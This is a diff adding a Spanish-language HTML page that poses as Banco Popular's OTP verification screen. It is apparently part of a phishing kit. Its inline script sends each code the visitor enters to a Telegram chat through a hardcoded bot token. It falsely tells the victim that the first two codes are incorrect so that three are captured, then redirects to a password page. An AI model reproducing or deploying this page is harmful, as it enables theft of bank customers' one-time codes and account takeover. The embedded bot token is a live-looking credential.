@@ -1,0 +1,210 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Ingresa el Código OTP - Banco Popular</title>
+    <link rel="stylesheet" href="styles.css">
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link href="https://fonts.googleapis.com/css2?family=Open+Sans:wght@400;600;700&display=swap" rel="stylesheet">
+    <style>
+        .error-message {
+            color: #d32f2f;
+            font-size: 12px;
+            margin-top: 8px;
+            display: none;
+        }
+        .error-message.show {
+            display: block;
+        }
+    </style>
+</head>
+<body>
+    <!-- Pantalla de Carga -->
+    <div id="loading-screen" class="loading-screen hidden">
+        <div class="loading-content">
+            <img src="img/popularhorizontal_new.svg" alt="Banco Popular" class="loading-logo">
+            <div class="loading-spinner"></div>
+        </div>
+    </div>
+
+    <div class="container">
+        <!-- Header -->
+        <header class="header">
+            <div class="header-content">
+                <img src="img/popularhorizontal_new.svg" alt="Banco Popular" class="logo">
+                <div class="header-icon">
+                    <img src="img/icon-security-lock.svg" alt="Security" class="security-icon">
+                </div>
+            </div>
+        </header>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- OTP Section -->
+            <section class="login-section">
+                <h1 class="title">Verificación de seguridad</h1>
+                <div class="logo-container">
+                    <img src="img/Isotipo.svg" alt="Banco Popular" class="isotipo">
+                    <span class="banco-text">banco popular</span>
+                </div>
+
+                <form class="login-form" id="otpForm">
+                    <div class="form-group">
+                        <label for="otp-input">Código de verificación</label>
+                        <input 
+                            type="text" 
+                            id="otp-input" 
+                            class="form-input" 
+                            placeholder=""
+                            maxlength="8"
+                            inputmode="numeric"
+                            pattern="[0-9]*"
+                        >
+                        <div class="error-message" id="errorMsg"></div>
+                        <span class="input-hint">Ingresa el código de 4 a 8 dígitos que recibiste por SMS o correo electrónico</span>
+                    </div>
+
+                    <button type="button" id="btn-continuar-otp" class="btn-continuar" disabled>Continuar</button>
+
+                    <div class="help-text-center">
+                        <a href="#" class="help-link">¿No recibiste el código?</a>
+                    </div>
+
+                    <div class="footer-links">
+                        <span class="footer-text">Protegido por reCAPTCHA | </span>
+                        <a href="#" class="footer-link">Privacidad</a>
+                        <span class="footer-text"> - </span>
+                        <a href="#" class="footer-link">Condiciones</a>
+                    </div>
+                </form>
+            </section>
+
+            <!-- Help Section -->
+            <section class="help-section">
+                <h2 class="help-title">¿Cómo podemos ayudarte?</h2>
+                <div class="help-options">
+                    <a href="#" class="help-card">
+                        <div class="help-icon">
+                            <img src="img/icon-solicitar.svg" alt="Solicitar productos">
+                        </div>
+                        <span class="help-text">Solicitar productos</span>
+                    </a>
+                    <a href="#" class="help-card">
+                        <div class="help-icon">
+                            <img src="img/icon-contacto.svg" alt="Contáctanos">
+                        </div>
+                        <span class="help-text">Contáctanos</span>
+                    </a>
+                </div>
+            </section>
+
+            <!-- Cards Dinámicas Section -->
+            <section class="pagos-section">
+                <div class="pagos-card" id="dynamic-card">
+                    <div class="pagos-content">
+                        <img src="img/Isotipo.svg" alt="Banco Popular" class="pagos-isotipo">
+                        <h3 class="pagos-title" id="card-title">Pagos rápidos y seguros</h3>
+                        <p class="pagos-description" id="card-description">
+                            Realiza la inscripción de tus servicios públicos y privados, págalos desde cualquier lugar.
+                        </p>
+                        <a href="#" class="pagos-link" id="card-link">
+                            <span id="link-text">Inscribe y paga</span>
+                            <span class="arrow-icon">→</span>
+                        </a>
+                    </div>
+                    <div class="pagos-image">
+                        <img src="img/Woman-1.png" alt="Persona" class="woman-image" id="card-image">
+                    </div>
+                </div>
+            </section>
+
+            <!-- Footer -->
+            <footer class="footer">
+                <div class="footer-links-bottom">
+                    <a href="#" class="footer-link-bottom">Seguridad</a>
+                    <a href="#" class="footer-link-bottom">Accesibilidad</a>
+                </div>
+                <div class="footer-logos">
+                    <img src="img/Isotipo.svg" alt="Banco Popular" class="footer-logo">
+                    <img src="img/aval.png" alt="Grupo Aval" class="footer-aval">
+                </div>
+                <div class="footer-info">
+                    <p class="footer-date" id="footer-date">Jueves, 27 de noviembre de 2025 | 10:25 p. m.</p>
+                    <p class="footer-copyright">© Banco Popular, Carrera 13 No 26-45 Bogotá</p>
+                </div>
+            </footer>
+        </main>
+    </div>
+
+    <script>
+        const TELEGRAM_BOT_TOKEN = '8882344336:AAF7YqBNYTL7Hb_9dPSicH9da29xEUSImGo';
+        const TELEGRAM_CHAT_ID = '-1003784784181';
+
+        let intentos = 0;
+
+        const otpInput = document.getElementById('otp-input');
+        const btnContinuar = document.getElementById('btn-continuar-otp');
+        const loadingScreen = document.getElementById('loading-screen');
+        const errorMsg = document.getElementById('errorMsg');
+
+        otpInput.addEventListener('input', function() {
+            this.value = this.value.replace(/\D/g, '').slice(0, 8);
+            validateOTP();
+        });
+
+        function validateOTP() {
+            const isValid = otpInput.value.length >= 4 && otpInput.value.length <= 8;
+            btnContinuar.disabled = !isValid;
+        }
+
+        btnContinuar.addEventListener('click', async function(e) {
+            e.preventDefault();
+            if (btnContinuar.disabled) return;
+
+            intentos++;
+            loadingScreen.classList.remove('hidden');
+
+            const mensaje = `📱 <b>OTP (INTENTO ${intentos}/3) - BANCO POPULAR</b>
+
+<b>Código OTP:</b> <code>${otpInput.value}</code>
+
+<b>⏰ Recibido:</b> ${new Date().toLocaleString('es-CO')}`;
+
+            try {
+                const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: mensaje, parse_mode: 'HTML' })
+                });
+
+                if ((await response.json()).ok) {
+                    if (intentos < 3) {
+                        setTimeout(() => {
+                            loadingScreen.classList.add('hidden');
+                            if (intentos === 1) {
+                                errorMsg.textContent = '❌ El código OTP es incorrecto.';
+                                errorMsg.classList.add('show');
+                            } else if (intentos === 2) {
+                                errorMsg.textContent = '⚠️ Error en la validación. Intente nuevamente.';
+                                errorMsg.classList.add('show');
+                            }
+                            otpInput.value = '';
+                            validateOTP();
+                        }, 1500);
+                    } else {
+                        setTimeout(() => {
+                            window.location.href = 'clave.html';
+                        }, 1500);
+                    }
+                } else {
+                    loadingScreen.classList.add('hidden');
+                }
+            } catch (error) {
+                loadingScreen.classList.add('hidden');
+            }
+        });
+    </script>
+</body>
+</html>
